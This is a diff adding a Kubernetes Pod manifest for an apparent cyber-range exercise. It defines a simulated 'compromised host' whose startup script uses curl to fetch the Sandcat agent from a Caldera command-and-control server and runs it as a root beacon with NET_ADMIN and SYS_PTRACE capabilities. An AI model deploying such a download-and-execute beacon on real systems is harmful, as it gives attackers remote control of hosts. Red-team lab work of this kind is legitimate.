@@ -1,0 +1,62 @@
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: compromised-host
+  namespace: cyber-range
+  labels:
+    app: compromised-host
+    role: attacker-agent
+    purpose: simulate-foothold
+    attack-class: post-exploitation
+spec:
+  hostname: web-server-01
+  restartPolicy: Always
+  containers:
+    - name: sandcat-agent
+      image: ubuntu:22.04
+      command: ["/bin/bash", "-c"]
+      args:
+        - |
+          set -e
+          echo "=== Compromised host starting up ==="
+
+          export DEBIAN_FRONTEND=noninteractive
+          apt-get update -qq
+          apt-get install -y -qq curl ca-certificates procps net-tools iputils-ping > /dev/null
+
+          echo "=== Downloading Sandcat agent from Caldera ==="
+          mkdir -p /opt/sandcat
+          cd /opt/sandcat
+
+          until curl -sSf -X POST \
+              -H "platform: linux" \
+              -H "file: sandcat.go" \
+              -H "gocat-version: gocat" \
+              http://caldera-server:8888/file/download \
+              -o sandcat; do
+            echo "Caldera not reachable yet, retrying in 5s..."
+            sleep 5
+          done
+
+          chmod +x sandcat
+          echo "=== Sandcat downloaded ($(stat -c%s sandcat) bytes) ==="
+
+          echo "=== Starting Sandcat beacon ==="
+          exec ./sandcat \
+            -server http://caldera-server:8888 \
+            -group red \
+            -v
+      resources:
+        requests:
+          cpu: "100m"
+          memory: "128Mi"
+        limits:
+          cpu: "500m"
+          memory: "512Mi"
+      securityContext:
+        runAsUser: 0
+        capabilities:
+          add:
+            - NET_ADMIN
+            - SYS_PTRACE
